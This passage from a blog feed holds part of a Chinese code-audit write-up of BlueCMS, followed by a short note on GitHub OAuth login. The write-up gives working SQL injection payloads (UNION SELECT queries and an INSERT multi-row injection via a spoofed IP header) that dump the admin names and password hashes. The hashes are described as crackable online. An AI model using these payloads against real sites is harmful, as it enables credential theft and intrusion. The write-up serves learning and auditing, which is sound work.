trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($ad_id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Error!'</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br></pre></td></tr></table></figure><p>发现这里ad_id传入了一个$ad_id，我们发现这个$ad_id是在代码1行那里传过来的id，判断了值是否为空然后执行getone()方法，然后跟进getone这个方法我们发现这个方法在路径uploads\include\mysql.class.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getone</span><span class="params">($sql, $type=MYSQL_ASSOC)</span></span>&#123;</span><br><span class="line">    $query = <span class="keyword">$this</span>-&gt;query($sql,<span class="keyword">$this</span>-&gt;linkid);</span><br><span class="line">    $row = mysql_fetch_array($query, $type);</span><br><span class="line">    <span class="keyword">return</span> $row;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里封装了一个sql查询的函数，指定的类型为数组类型<code>MYSQL_ASSOC</code>是关联数组，<code>mysql_fetch_array</code>函数从结果集中取得一行作为关联数组最后返回行，这里我们已经发现这个过程下来没有没有任何的过滤的，主要是插入到数据库查询语句中的$ad_id没有经过任何的过滤，因而导致了SQL注入。从代码中可以看出：<code>$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&#39;ad&#39;).&quot; WHERE ad_id =&quot;.$ad_id);</code>说明存在整形注入。</p><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>找到程序入口通过order by查询首先查询多少列，我们发现在order by 7无回显在8的时候报错了说明有8列</p><p><img src="/images/Bluecmssql/1562687979352.png" alt="1562687979352"></p><p><img src="/images/Bluecmssql/1562688018782.png" alt="1562688018782"></p><p>用联合查询数据库信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_id=1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure><p>这里发现显示的是一个空白的页面这时需要右键查看源码发现</p><p><img src="/images/Bluecmssql/1562688268808.png" alt="1562688268808"></p><p>查看当前登录的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_id=1 union select 1,2,3,4,5,6,user()</span><br></pre></td></tr></table></figure><p><img src="/images/Bluecmssql/1562688330404.png" alt="1562688330404"></p><p>爆表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_id=1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure><p><img src="/images/Bluecmssql/1562688699934.png" alt="1562688699934"></p><p><img src="/images/Bluecmssql/1562688904920.png" alt="1562688904920"></p><p>发现已经成功爆出表名，这里就不继续了直接构造语句获取用户名的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin</span><br></pre></td></tr></table></figure><p><img src="/images/Bluecmssql/1562689139317.png" alt="1562689139317"></p><p>发现这里md5加密的直接可以在线解密的</p><p><img src="/images/Bluecmssql/1562689291200.png" alt="1562689291200"></p><h3 id="sql注入二"><a href="#sql注入二" class="headerlink" title="sql注入二"></a>sql注入二</h3><p>再查看Seay发现的可疑注入点，在文件/uploads/include/common.fun.php中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) </span><br><span class="line">&#123; </span><br><span class="line">$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED'</span>)) </span><br><span class="line">&#123; </span><br><span class="line">$ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件中有<code>getip()</code>函数，该函数是用来获取用户IP。getenv这个函数是用来获取环境变量的值并没有对$ip进行校验，然后就全局搜索函数，发现有执行sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot;.table(&apos;comment&apos;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span><br><span class="line">VALUES (&apos;&apos;, &apos;$id&apos;, &apos;$user_id&apos;, &apos;$type&apos;, &apos;$mood&apos;, &apos;$content&apos;, &apos;$timestamp&apos;, &apos;&quot;.getip().&quot;&apos;, &apos;$is_check&apos;)&quot;;</span><br><span class="line">$db-&gt;query($sql);</span><br></pre></td></tr></table></figure><p>这里可以利用拼接的点就是<code>&quot;.getip().&quot;</code>这个点，首先要知道的是在SQL语句中的<code>INSERT INTO</code>来插入内容是可以一次插入多条数据的。这里还是废了点时间的对数据库的操作不是很熟 ，insert into这个插入语句是可以一次插多条数据的，所这时我么可以先闭合前面的单引号然后利用第二条插入。payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1','1'),('','1','1','1','6',(<span class="keyword">select</span> <span class="keyword">concat</span>(admin_name,<span class="string">':'</span>,pwd) <span class="keyword">from</span> blue_admin),<span class="string">'1'</span>,<span class="string">'1</span></span><br></pre></td></tr></table></figure><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>这是第一次自己整套这么看下来还是挺累的不过这套代码还是比较简单要加强学习啊，要学的东西很多，加强代码审计。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;这个cms的漏洞很早就爆出来了，而且很多网站都有相应的文章，这里只是针对自己在代码审计这方面学习的加强，因为自己太菜所以选了一个结构稍微简单，对新手友好一点的cms。&lt;/p&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://onekingcc.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>使用第三方接口授权登录github的流程</title>
    <link href="http://onekingcc.github.io/2019/07/07/%E4%BD%BF%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8E%A5%E5%8F%A3%E7%99%BB%E5%BD%95github%E7%9A%84%E6%B5%81%E7%A8%8B/"/>
    <id>http://onekingcc.github.io/2019/07/07/使用第三方接口登录github的流程/</id>
    <published>2019-07-07T06:55:01.000Z</published>
    <updated>2019-07-08T11:11:00.567Z</updated>
    
    <content type="html"><![CDATA[<p>因为最近在写登录这个模块功能的时候，然后选择第三方接口登录，阅读了官方文档的API文档，所以决定记录下来<a id="more"></a>：</p><h2 id="登录情景"><a href="#登录情景" class="headerlink" title="登录情景"></a>登录情景</h2><p>首先有一个用户发送一个消息，请求登录社区，这时点击登录时，首先完成自己的逻辑，去构造相应的证书，client_secret，client，client_id然后再去调用github的接口。</p><h2 id="如何调用github接口"><a href="#如何调用github接口" class="headerlink" title="如何调用github接口"></a>如何调用github接口</h2><ol><li>首先它是去调用的一个授权的地址authorize，当验证通过后github会重新访问社区。</li><li>之后github会主动去回调redirect_uri预先写好的地址携带code访问社区</li><li>社区接受到这里的地址请求时，然后通过access_token解析携带code再次调用github</li><li>这里如果code验证正确，就会返回一个access_token</li><li>这时user携带acces_token,如果正确就会返回user信息</li><li>存入数据库，更新登录状态。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为最近在写登录这个模块功能的时候，然后选择第三方接口登录，阅读了官方文档的API文档，所以决定记录下来&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://onekingcc.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="开发接口" scheme="http://onekingcc.github.io/tags/%E5%BC%80%E5%8F%91%E6%8E%A5%E5%8F%A3/"/>
    
  </entry>
  
</feed>
